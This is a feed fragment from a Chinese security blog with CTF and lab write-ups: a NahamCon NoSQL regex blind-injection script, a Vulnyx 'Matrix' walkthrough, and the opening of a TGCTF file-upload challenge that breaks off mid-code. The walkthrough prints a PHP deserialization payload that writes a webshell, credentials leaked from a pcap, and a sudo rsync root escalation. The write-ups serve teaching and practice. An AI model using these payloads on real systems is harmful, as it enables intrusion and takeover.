class="hljs-string">&#x27;queue_time&#x27;</span>] = <span class="hljs-built_in">int</span>(time.time())<br><br>new_token = jwt.encode(payload,secret,algorithm=<span class="hljs-string">&quot;HS256&quot;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;新的jwt：<span class="hljs-subst">&#123;new_token&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>带着token访问<code>purchase</code></p><p><img src="/img/nahamcon-ctf-2025/image-20250528110537961.png"></p><p><img src="/img/nahamcon-ctf-2025/image-20250528110547152.png"></p><h2 id="NoSequel"><a href="#NoSequel" class="headerlink" title="NoSequel"></a>NoSequel</h2><p>这是一个盲注的题目。但不属于sql。</p><p><img src="/img/nahamcon-ctf-2025/image-20250528113408047.png"></p><p>这里根据下面的语法提示，我们来进行搜索查询。假设我们<code>flag:&#123;$regex:&quot;flag&#123;1&quot;&#125;</code></p><p>则会报错</p><p><img src="/img/nahamcon-ctf-2025/image-20250528113443185.png"></p><p>意思是无结果匹配。</p><p>那么假设我们fuzz，fuzz到4的时候<code>flag:&#123;$regex: &quot;flag&#123;4&quot;&#125;</code></p><p><img src="/img/nahamcon-ctf-2025/image-20250528113510423.png"></p><p>结果为：<code>Pattern matched</code></p><p>那么可以利用这个回显进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>charset = string.ascii_lowercase + string.digits + <span class="hljs-string">&quot;-&quot;</span><br>url=<span class="hljs-string">&quot;http://challenge.nahamcon.com:30246/search&quot;</span><br>flag=<span class="hljs-string">&quot;flag&#123;&quot;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> flag.endswith(<span class="hljs-string">&quot;&#125;&quot;</span>):<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> charset:<br>        try_str = flag + c<br>        searchQuery = <span class="hljs-string">f&#x27;flag: &#123;&#123;&quot;$regex&quot;:&quot;^<span class="hljs-subst">&#123;try_str&#125;</span>&quot;&#125;&#125;&#x27;</span><br>        data = &#123;<br>            <span class="hljs-string">&quot;query&quot;</span>: searchQuery,<br>            <span class="hljs-string">&quot;collection&quot;</span>: <span class="hljs-string">&quot;flags&quot;</span><br>        &#125;<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-&gt;] Trying: <span class="hljs-subst">&#123;try_str&#125;</span>&quot;</span>)<br>        res = requests.post(url,data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Pattern matched&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>            flag += c<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;try_str&#125;</span>&quot;</span>) <br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[√]最终的flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnyx-Matrix</title>
    <link href="/2025/04/26/vulnyx-Matrix/"/>
    <url>/2025/04/26/vulnyx-Matrix/</url>
    
    <content type="html"><![CDATA[<p>Vlunyx靶场中的中等难度Linux靶机 </p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/tmp]<br>└─# nmap -Pn -n -p- 192.168.56.103                                 <br>Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-25 22:56 EDT<br>Nmap scan report for 192.168.56.103<br>Host is up (0.0014s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:EA:04:13 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)<br><br>Nmap done: 1 IP address (1 host up) scanned in 20.37 seconds<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/tmp]<br>└─# nmap -Pn -n -sCV  -p22,80 192.168.56.103<br>Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-25 22:58 EDT<br>Nmap scan report for 192.168.56.103<br>Host is up (0.0012s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)<br>| ssh-hostkey: <br>|   256 67:78:c9:d2:e3:ff:be:fc:9e:13:9a:af:9d:59:17:66 (ECDSA)<br>|_  256 1a:78:b1:e6:f1:f0:d1:b3:ab:c8:3f:95:fd:46:52:67 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: Enter The Matrix<br>MAC Address: 08:00:27:EA:04:13 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 7.39 seconds<br></code></pre></td></tr></table></figure><h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><h2 id="web-80"><a href="#web-80" class="headerlink" title="web 80"></a>web 80</h2><p><img src="/img/vulnyx-Matrix/image-20250426105925458.png"></p><p>选择<code>RED PILL</code> </p><p><img src="/img/vulnyx-Matrix/image-20250426105950143.png"></p><p>会跳转到一个PDF页面。</p><p>选择<code>BLUE PILL</code></p><p><img src="/img/vulnyx-Matrix/image-20250426110115016.png"></p><p>会跳转到 <code>google</code></p><p>不过在源码中可以发现提示 </p><p><img src="/img/vulnyx-Matrix/image-20250426110216616.png"></p><p><img src="/img/vulnyx-Matrix/image-20250426110222535.png"></p><p>fuzz .pcap文件？</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/tmp]<br>└─# gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &quot;http://192.168.56.103&quot; --no-error -t 100  -x .pcap                <br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.103<br>[+] Method:                  GET<br>[+] Threads:                 100<br>[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              pcap<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster in directory enumeration mode<br>===============================================================<br>/trinity.pcap         (Status: 200) [Size: 146389]<br></code></pre></td></tr></table></figure><p><code>trinity.pcap</code></p><p>流量包里有很多信息。</p><p><img src="/img/vulnyx-Matrix/image-20250426130715201.png"></p><p>从这里可以得到一些用户凭证 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">MAND: rsync --daemon /home/smith/file.txt 192.168.2.100:/backup/smith/<br>PASSWORD: kT8020e136Z2YLJa2fEZ<br><br>MAND: rsync --daemon /home/john/file.txt 192.168.2.100:/backup/john/<br>PASSWORD: krGVRU2vCedfwjVZXDrp<br><br>MAND: rsync --daemon /home/alice/file.txt 192.168.2.100:/backup/alice/<br>PASSWORD: BgUvmyV0OEgEDpMjpJUv<br><br>MAND: rsync --daemon /home/neo/file.txt 192.168.2.100:/backup/neo/<br>PASSWORD: 2LmQA1WT2Xc4avgGA1yY<br></code></pre></td></tr></table></figure><p>其中有一个webp图片，导出为图片。</p><p><img src="/img/vulnyx-Matrix/image-20250426111307051.png"></p><p>在其中的HTTP协议中只有一个返回包。跟随流后在其中找到提示 </p><p><img src="/img/vulnyx-Matrix/image-20250426110615869.png"></p><p>有一个子域名 <code>M47r1X.matrix.nyx</code></p><p>添加 <code>/etc/hosts</code>后访问 </p><p><img src="/img/vulnyx-Matrix/image-20250426110801130.png"></p><p>继续对子域名进行目录扫描 </p><h3 id="子域名-目录扫描"><a href="#子域名-目录扫描" class="headerlink" title="子域名 目录扫描"></a>子域名 目录扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/tmp]<br>└─# gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &quot;http://M47r1X.matrix.nyx/&quot; --no-error -t 100  -x txt,php,zip,bak,html<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://M47r1X.matrix.nyx/<br>[+] Method:                  GET<br>[+] Threads:                 100<br>[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              txt,php,zip,bak,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster in directory enumeration mode<br>===============================================================<br>/index.php            (Status: 200) [Size: 3440]<br>/.php                 (Status: 403) [Size: 282]<br>/.html                (Status: 403) [Size: 282]<br>/messages.txt         (Status: 200) [Size: 1]<br>/.html                (Status: 403) [Size: 282]<br>/.php                 (Status: 403) [Size: 282]<br></code></pre></td></tr></table></figure><p><code>messages.txt</code></p><p>我尝试在页面中输入<code>id</code></p><p><img src="/img/vulnyx-Matrix/image-20250426112703310.png"></p><p>emm,还是一个随机的</p><p><img src="/img/vulnyx-Matrix/image-20250426113727281.png"></p><h3 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h3><p><code>filtrate-backend-matrix.php.txt</code></p><p><img src="/img/vulnyx-Matrix/image-20250426115403471.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Message</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;messages.txt&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span></span>): <span class="hljs-title">void</span></span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$file</span> = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;file&#x27;</span>] ?? <span class="hljs-variable language_">$this</span>-&gt;file;<br>            <span class="hljs-variable language_">$this</span>-&gt;message = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;message&#x27;</span>];<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;message&#x27;</span>] . <span class="hljs-string">&quot;\n&quot;</span>, FILE_APPEND);<br>        &#125;<br>    &#125;<br><br>    <br></code></pre></td></tr></table></figure><p><code>unserialize</code>方法当对象被反序列化时调用，并且存在任意文件写入操作。当然我们必须对<code>file</code>以及<code>message</code>进行可控。</p><p><img src="/img/vulnyx-Matrix/image-20250426115515366.png"></p><p>在请求包中，可以发现我们输入的数据会自动进行序列化且 URL 编码。</p><p>在前端js中有序列化数据的函数 </p><p><img src="/img/vulnyx-Matrix/image-20250426115816996.png"></p><p>那么我们可以尝试伪造 <code>data</code>的序列化数据，进行写入木马 。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Message</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;messages.txt&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;file&#x27;</span>],<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;message&#x27;</span>].<span class="hljs-string">&quot;\n&quot;</span>, FILE_APPEND);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>();<br><span class="hljs-variable">$msg</span>-&gt;file = <span class="hljs-string">&#x27;1.phar&#x27;</span>;<br><span class="hljs-variable">$msg</span>-&gt;message = <span class="hljs-string">&quot;&lt;?php system(\$_GET[1]);?&gt;&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>);<br><br><br><br><br></code></pre></td></tr></table></figure><p><img src="/img/vulnyx-Matrix/image-20250426125518181.png"></p><p>成功getshell，反弹shell </p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="pcap-密码泄露"><a href="#pcap-密码泄露" class="headerlink" title="pcap 密码泄露"></a>pcap 密码泄露</h2><p>从流量包中我们获取到了一些用户的密码。通过<code>/etc/passwd</code>发现存在<code>smith</code>用户。</p><p><img src="/img/vulnyx-Matrix/image-20250426130951097.png"></p><h2 id="sudo-l-rsync"><a href="#sudo-l-rsync" class="headerlink" title="sudo -l rsync"></a>sudo -l rsync</h2><p><img src="/img/vulnyx-Matrix/image-20250426131029072.png"></p><p><code>sudo rsync -e &#39;sh -c &quot;sh 0&lt;&amp;2 1&gt;&amp;2&quot;&#39; 127.0.0.1:/dev/null</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">id</span></span><br>uid=0(root) gid=0(root) grupos=0(root)<br><span class="hljs-meta prompt_"># </span><span class="language-bash">bash</span>           <br>root@matrix:/var/www/html# cat /root/root.txt <br>5f3cae74fbcf1919ccxxxxx<br>root@matrix:/var/www/html# cat /home/smith/user.txt <br>13fd11421e33199c202xxxxx<br>root@matrix:/var/www/html# <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TGCTF-2025</title>
    <link href="/2025/04/25/TGCTF-2025/"/>
    <url>/2025/04/25/TGCTF-2025/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ez-upload"><a href="#ez-upload" class="headerlink" title="(ez)upload"></a>(ez)upload</h2><h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><h4 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file("></a>move_uploaded_file(</h4><p>move_uploaded_file(<a href="https://www.php.net/manual/zh/language.types.string.php">string</a> <code>$from</code>, <a href="https://www.php.net/manual/zh/language.types.string.php">string</a> <code>$to</code>): [bool] 函数缺陷：若第二个参数可控，就可以自定义上传文件后缀名。</p><h4 id="PCRE回溯"><a href="#PCRE回溯" class="headerlink" title="PCRE回溯"></a>PCRE回溯</h4><p>关于PCRE回溯，即贪婪模式<code>.*</code>或非贪婪模式<code>.+?</code></p><p>然而PCRE引擎在处理正则表达式的时候，有一个默认的回溯机制（100w次）</p><h5 id="贪婪模式"><a href="#贪婪模式" class="headerlink" title="贪婪模式"></a>贪婪模式</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>,<span class="hljs-variable">$str</span>)<br></code></pre></td></tr></table></figure><p>由于在匹配到<code>;?&gt;]</code>之前已经有了<code>.*</code>，所以会发生 <strong>匹配过猛</strong>的现象，会造成回溯</p><h5 id="非贪婪模式"><a href="#非贪婪模式" class="headerlink" title="非贪婪模式"></a>非贪婪模式</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?&lt;/s&#x27;</span>, str)) <br></code></pre></td></tr></table></figure><p>由于在匹配到<code>&lt;</code>之前就已经有了<code>.+?</code>，此处的<code>.+?</code>每次只匹配一个字符，当下次匹配不到<code>&lt;</code>的时候，就会回溯调用<code>.+?</code>。再继续匹配<code>&lt;</code>。会发生<strong>匹配不足</strong>。容易造成回溯</p><hr><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>访问<code>upload.php.bak</code>拿到源码进行分析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UPLOAD_PATH&#x27;</span>, <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/uploads/&#x27;</span>);<br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$status_code</span> = <span class="hljs-number">200</span>; <span class="hljs-comment">// 默认状态码为 200</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php4&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;php2&quot;</span>, <span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;htm&quot;</span>, <span class="hljs-string">&quot;phtml&quot;</span>, <span class="hljs-string">&quot;pht&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jspx&quot;</span>, <span class="hljs-string">&quot;jsw&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jspf&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>, <span class="hljs-string">&quot;asp&quot;</span>, <span class="hljs-string">&quot;aspx&quot;</span>, <span class="hljs-string">&quot;asa&quot;</span>, <span class="hljs-string">&quot;asax&quot;</span>, <span class="hljs-string">&quot;ascx&quot;</span>, <span class="hljs-string">&quot;ashx&quot;</span>, <span class="hljs-string">&quot;asmx&quot;</span>, <span class="hljs-string">&quot;cer&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>, <span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file_name</span>, PATHINFO_EXTENSION);<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$temp_file</span>);<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?&lt;/s&#x27;</span>, <span class="hljs-variable">$file_content</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件内容包含非法字符，禁止上传！&#x27;</span>;<br>                <span class="hljs-variable">$status_code</span> = <span class="hljs-number">403</span>; <span class="hljs-comment">// 403 表示禁止访问</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-variable">$file_name</span>;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                    <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件上传成功！&#x27;</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>                    <span class="hljs-variable">$status_code</span> = <span class="hljs-number">500</span>; <span class="hljs-comment">// 500 表示服务器内部错误</span><br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;禁止保存为该类型文件！&#x27;</span>;<br>            <span class="hljs-variable">$status_code</span> = <span class="hljs-number">403</span>; <span class="hljs-comment">// 403 表示禁止访问</span><br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>        <span class="hljs-variable">$status_code</span> = <span class="hljs-number">404</span>; <span class="hljs-comment">// 404 表示资源未找到</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 设置 HTTP 状态码</span><br><span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-variable">$status_code</span>);<br><br><span class="hljs-comment">// 输出结果</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<br>    <span class="hljs-string">&#x27;status_code&#x27;</span> =&gt; <span class="hljs-variable">$status_code</span>,<br>    <span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-variable">$msg</span>,<br>]);<br></code></pre></td></tr></table></figure><p>其中漏洞点在<code>move_uploaded_file</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        &#125;<br><span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-variable">$file_name</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                    <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-variable">$msg</span> = <span 